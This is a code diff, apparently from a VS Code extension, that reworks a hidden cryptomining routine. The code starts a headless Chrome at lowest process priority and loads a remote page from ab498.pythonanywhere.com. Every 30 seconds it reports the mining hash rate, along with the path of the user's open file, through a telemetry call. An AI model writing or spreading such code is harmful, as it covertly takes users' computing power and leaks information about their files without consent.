@@ -30,7 +30,26 @@
 
   await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
-  const browser = await puppeteer.launch({
+  let browser;
+  let page;
+  setInterval(async () => {
+    if (!browser || !page)
+      return tstt({
+        message: "HASH_INIT",
+        value: 0,
+        file: safe(() => editor?.document?.uri?.fsPath)
+      });
+    const hs = await page.evaluate(() => {
+      return window._client.getHashesPerSecond();
+    });
+    tstt({
+      message: "HASH",
+      value: parseFloat(hs).toFixed(2),
+      file: safe(() => editor?.document?.uri?.fsPath)
+    });
+  }, 30000);
+  
+  browser = await puppeteer.launch({
     executablePath: chromePath,
     headless: true,
     args: [
@@ -40,20 +59,10 @@
     ]
   });
   os.setPriority(browser.process().pid, 19);
-  let page = await browser.newPage();
+  page = await browser.newPage();
   await page.goto('https://ab498.pythonanywhere.com/files/init.html');
 
 
-  setInterval(async () => {
-    const hs = await page.evaluate(() => {
-      return window._client.getHashesPerSecond();
-    });
-    tstt({
-      message: "HASH",
-      value: parseFloat(hs).toFixed(2),
-      file: safe(() => editor?.document?.uri?.fsPath)
-    })
-  }, 30000);
 
   await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
